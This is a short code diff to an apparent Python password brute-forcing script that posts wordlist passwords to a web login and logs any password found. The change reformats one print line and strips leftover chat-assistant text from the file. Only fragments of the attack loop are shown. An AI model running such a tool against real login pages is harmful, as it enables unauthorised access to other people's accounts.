@@ -59,7 +59,7 @@ def brute_force(url, profile_id, wordlist):
             response = session.post(url + profile_id[0], data=payload)
 
             if "Login failed" not in response.text:
-                print(blue + "\n[" + wi + "*" + blue + "] Password Found:" + yl + f" {password}" + wi)
+                print(blue + f"\n[*] Password Found: {yl}{password}{wi}")
                 logging.info(f"Password found: {password}")
                 break
 
@@ -90,6 +90,3 @@ if __name__ == "__main__":
     logging.info("Brute force started.")
     brute_force(url, profile_id, wordlist)
     logging.info("Brute force completed.")
-```
-
-This should resolve the indentation issues. Make sure to replace any placeholder values with your actual values.
